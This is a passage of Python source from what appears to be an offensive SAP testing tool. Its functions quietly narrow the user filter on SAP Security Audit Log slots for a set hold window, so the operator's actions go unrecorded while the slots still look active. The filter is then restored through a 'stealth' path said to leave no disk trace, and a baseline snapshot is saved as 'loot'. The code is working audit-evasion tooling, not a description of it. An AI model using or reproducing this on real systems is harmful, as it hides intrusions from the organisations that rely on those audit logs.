                     f"UNAME restored (stealth — no disk trace)")
    except Exception:
        pass

    return _wrap_result(
        technique, True,
        slotno=",".join(target_slots),
        hold_seconds=hold_seconds,
        baseline_unames=baseline_unames,
        replacement_uname=replacement_uname,
        after_restore="stealth via RSAU_UPD_AUDIT_CONFIG (SHM-only)",
        stealth_mode=True)


def tier3_sal_uname_narrow(state, node, slotno,
                             replacement_uname: str,
                             hold_seconds: float = 5.0,
                             creds=None) -> dict:
    """Swap the UNAME filter of one or more active SAL slots for a
    hold window, then auto-restore.

    The slot stays STATUS='X' (still appears active in SM19) but its
    user-filter no longer matches SAPMAP00.  Only events from users
    whose name matches ``replacement_uname`` are recorded by the slot
    during the window.

    Args:
        slotno: ``"1"``, ``"1,2,3"``, list, or ``"ALL"``.
        replacement_uname: SAL UNAME pattern to install (e.g. an
            operator's real user; SAP* / wildcard support depends on
            the slot's SEL_USER_GEN flag).
        hold_seconds: how long to keep the swap in place.

    Only the stealth writer is attempted.  Fallback to
    RSAU_API_SET_PROFILE is intentionally NOT wired here because the
    UNAME swap is purely a per-slot mutation and the stealth path
    works on every kernel that exposes RSAU_UPD_AUDIT_CONFIG.
    """
    technique = "sal_uname_narrow"
    try:
        assert_evasion_allowed(state, node, technique)
    except EvasionGateError as e:
        return _wrap_result(technique, False, error=str(e),
                             slotno=str(slotno),
                             hold_seconds=hold_seconds)

    replacement_uname = (replacement_uname or "").strip()
    if not replacement_uname:
        return _wrap_result(
            technique, False,
            slotno=str(slotno), hold_seconds=hold_seconds,
            error="replacement_uname required")

    sid = getattr(node, "sid", "?")
    try:
        stealth = _try_stealth_sal_uname_narrow(
            state, node, sid, slotno, replacement_uname,
            hold_seconds, creds, technique)
        if stealth is not None:
            return stealth
        return _wrap_result(
            technique, False,
            slotno=str(slotno), hold_seconds=hold_seconds,
            error="stealth writer unavailable (legacy RSAU FMs missing)")
    except EvasionGateError as e:
        return _wrap_result(technique, False, error=str(e),
                             slotno=str(slotno),
                             hold_seconds=hold_seconds)
    except Exception as e:
        return _wrap_result(
            technique, False, error=f"unexpected: {e!r}",
            slotno=str(slotno), hold_seconds=hold_seconds)


def tier3_capture_baseline_only(state, node, creds=None) -> dict:
    """Standalone baseline capture without invoking any mutation.

    Useful for the GUI's Pre-flight panel — the operator can confirm
    a baseline JSON exists for the target before arming any other
    Tier 3 technique.  Doesn't go through ``evasion_window`` because
    there's nothing to restore.
    """
    technique = "rz11_dynamic_set"   # arbitrary registered id used for the
                                       # gate; nothing actually mutates
    try:
        assert_evasion_allowed(state, node, technique,
                                require_baseline=False)
    except EvasionGateError as e:
        return {"ok": False, "technique": "baseline_capture",
                "error": str(e), "snapshot_loot": ""}

    snap = capture_baseline(node, creds=creds)
    if not snap.params:
        return {"ok": False, "technique": "baseline_capture",
                "error": "capture returned empty (no params readable)",
                "snapshot_loot": ""}

    # Mark on the session config that a baseline now exists.  This is
    # what unblocks the `require_baseline` check for other techniques.
    try:
        from sapmap_evasion import EvasionConfig
        cfg = EvasionConfig.from_dict(state.evasion or {})
        cfg.baseline_captured_at = snap.captured_at
        state.evasion = cfg.to_dict()
    except Exception as e:
        logger.warning(f"could not persist baseline timestamp: {e}")

    return {"ok": True, "technique": "baseline_capture",
            "sid": snap.sid, "captured_at": snap.captured_at,
            "snapshot_loot": snap.loot_path,
            "param_count": len(snap.params),
            "filter_row_count": len(snap.sal_filter_rows)}
